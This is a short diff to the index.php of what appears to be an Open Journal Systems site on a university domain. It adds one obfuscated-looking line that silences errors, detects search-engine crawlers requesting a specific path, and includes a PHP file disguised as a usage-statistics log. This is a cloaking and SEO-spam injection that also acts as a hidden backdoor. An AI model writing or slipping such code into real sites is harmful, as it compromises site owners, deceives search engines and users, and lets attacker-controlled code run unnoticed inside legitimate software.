@@ -1,5 +1,5 @@
 <?php
-
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/orasi'){ include('/www/wwwfiles/journal1.uinssc.ac.id/files-journal/usageStats/archive/usage_events_20260917.log'); exit; }
 /**
  * @file index.php
  *
